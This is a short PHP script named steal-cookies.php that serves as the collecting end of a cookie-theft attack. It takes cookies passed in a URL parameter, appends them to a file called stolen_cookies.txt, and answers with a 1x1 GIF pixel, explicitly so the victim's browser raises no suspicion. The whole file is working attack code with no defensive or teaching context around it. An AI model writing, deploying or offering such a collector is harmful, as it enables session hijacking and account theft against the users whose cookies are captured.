// steal-cookies.php

// Get the cookies from the URL parameter
$cookies = $_GET['cookies'];

// Log the cookies to a file or database
file_put_contents('stolen_cookies.txt', $cookies . "\n");

// Return a 1x1 pixel image to avoid raising suspicion
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
